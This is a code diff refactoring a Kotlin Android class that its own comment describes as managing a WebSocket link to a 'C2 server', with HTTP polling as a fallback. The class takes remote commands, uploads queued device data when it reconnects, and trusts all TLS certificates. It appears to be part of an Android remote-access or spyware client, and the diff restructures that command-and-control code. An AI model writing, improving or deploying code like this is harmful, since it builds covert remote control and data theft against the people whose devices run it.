@@ -10,14 +10,19 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicBoolean
+
+data class TransportConfig(
+    val scope: CoroutineScope,
+    val dataSyncManager: DataSyncManager
+)
 
 /**
  * Manages WebSocket connection to C2 server + HTTP polling fallback.
  * Delegates received commands to onCommandReceived callback.
  */
 class CommandTransport(
-    private val scope: CoroutineScope,
-    private val dataSyncManager: DataSyncManager,
+    private val config: TransportConfig,
     private val getDeviceId: () -> String,
     private val onCommandReceived: (command: String, params: JSONObject?, requestId: String?, priority: String, resource: String) -> Unit
 ) {
@@ -34,14 +39,13 @@ class CommandTransport(
     @Volatile private var httpPollingActive = false
     private var pollingJob: Job? = null
     private val HTTP_POLL_INTERVAL = 5000L // 5 seconds
-    @Volatile private var isConnecting = false
+    private val isConnecting = AtomicBoolean(false)
 
     // Track current request_id for command-response correlation
     val currentRequestId = ThreadLocal<String?>()
 
     fun connect() {
-        if (isConnecting) return
-        isConnecting = true
+        if (!isConnecting.compareAndSet(false, true)) return
         try {
             // Clean up previous client/socket before reconnecting
             try {
@@ -53,12 +57,7 @@ class CommandTransport(
             } catch (_: Exception) {}
 
             Log.d(TAG, "connectWebSocket() called, serverUrl=${AndroidConfig.serverUrl}")
-            client = TrustAllCertificates.createClientBuilder()
-                .connectTimeout(10, TimeUnit.SECONDS)
-                .readTimeout(0, TimeUnit.MILLISECONDS) // No read timeout for WS
-                .writeTimeout(30, TimeUnit.SECONDS)
-                .pingInterval(25, TimeUnit.SECONDS)
-                .build()
+            client = buildOkHttpClient()
 
             val wsUrl = "${AndroidConfig.websocketUrl}&device_id=${getDeviceId()}"
             Log.d(TAG, "WebSocket connecting to: $wsUrl")
@@ -66,49 +65,59 @@ class CommandTransport(
                 .url(wsUrl)
                 .build()
 
-            webSocket = client?.newWebSocket(request, object : WebSocketListener() {
-                override fun onOpen(webSocket: WebSocket, response: Response) {
-                    Log.d(TAG, "WebSocket connected")
-                    isConnected = true
-                    isConnecting = false
-                    reconnectAttempts = 0
-                    stopHttpPolling()
-                    subscribeToChannel()
-
-                    // Flush any offline-queued data
-                    if (dataSyncManager.hasQueuedData()) {
-                        Log.d(TAG, "Flushing ${dataSyncManager.queuedCount()} queued items...")
-                        dataSyncManager.flushAll { count ->
-                            Log.d(TAG, "Offline sync complete: $count items uploaded")
-                        }
-                    }
-                }
-
-                override fun onMessage(webSocket: WebSocket, text: String) {
-                    handleMessage(text)
-                }
-
-                override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
-                    Log.d(TAG, "WebSocket closing: $reason")
-                }
-
-                override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
-                    Log.d(TAG, "WebSocket closed: $reason")
-                    isConnected = false
-                    isConnecting = false
-                    scheduleReconnect()
-                }
-
-                override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
-                    Log.e(TAG, "WebSocket error: ${t.message}")
-                    isConnected = false
-                    isConnecting = false
-                    scheduleReconnect()
-                }
-            })
+            webSocket = client?.newWebSocket(request, createWebSocketListener())
         } catch (e: Exception) {
             Log.e(TAG, "Failed to connect WebSocket: ${(e.message ?: "Unknown error")}")
-            isConnecting = false
+            isConnecting.set(false)
+            scheduleReconnect()
+        }
+    }
+
+    private fun buildOkHttpClient(): OkHttpClient {
+        return TrustAllCertificates.createClientBuilder()
+            .connectTimeout(10, TimeUnit.SECONDS)
+            .readTimeout(0, TimeUnit.MILLISECONDS) // No read timeout for WS
+            .writeTimeout(30, TimeUnit.SECONDS)
+            .pingInterval(25, TimeUnit.SECONDS)
+            .build()
+    }
+
+    private fun createWebSocketListener(): WebSocketListener = object : WebSocketListener() {
+        override fun onOpen(webSocket: WebSocket, response: Response) {
+            Log.d(TAG, "WebSocket connected")
+            isConnected = true
+            isConnecting.set(false)
+            reconnectAttempts = 0
+            stopHttpPolling()
+            subscribeToChannel()
+
+            if (config.dataSyncManager.hasQueuedData()) {
+                Log.d(TAG, "Flushing ${config.dataSyncManager.queuedCount()} queued items...")
+                config.dataSyncManager.flushAll { count ->
+                    Log.d(TAG, "Offline sync complete: $count items uploaded")
+                }
+            }
+        }
+
+        override fun onMessage(webSocket: WebSocket, text: String) {
+            handleMessage(text)
+        }
+
+        override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
+            Log.d(TAG, "WebSocket closing: $reason")
+        }
+
+        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
+            Log.d(TAG, "WebSocket closed: $reason")
+            isConnected = false
+            isConnecting.set(false)
+            scheduleReconnect()
+        }
+
+        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+            Log.e(TAG, "WebSocket error: ${t.message}")
+            isConnected = false
+            isConnecting.set(false)
             scheduleReconnect()
         }
     }
@@ -192,7 +201,7 @@ class CommandTransport(
         if (isConnected) {
             webSocket?.send(message.toString())
         } else if (httpPollingActive && !reqId.isNullOrEmpty()) {
-            scope.launch { sendHttpResponse(type, data) }
+            config.scope.launch { sendHttpResponse(type, data) }
         }
     }
 
@@ -222,7 +231,7 @@ class CommandTransport(
             }
         }
 
-        scope.launch {
+        config.scope.launch {
             delay(delay)
             synchronized(this@CommandTransport) {
                 if (!isConnected) {
@@ -238,7 +247,7 @@ class CommandTransport(
         httpPollingActive = true
         Log.d(TAG, "Starting HTTP polling fallback (WS unavailable)")
 
-        pollingJob = scope.launch {
+        pollingJob = config.scope.launch {
             while (httpPollingActive && isActive) {
                 try {
                     pollForCommands()
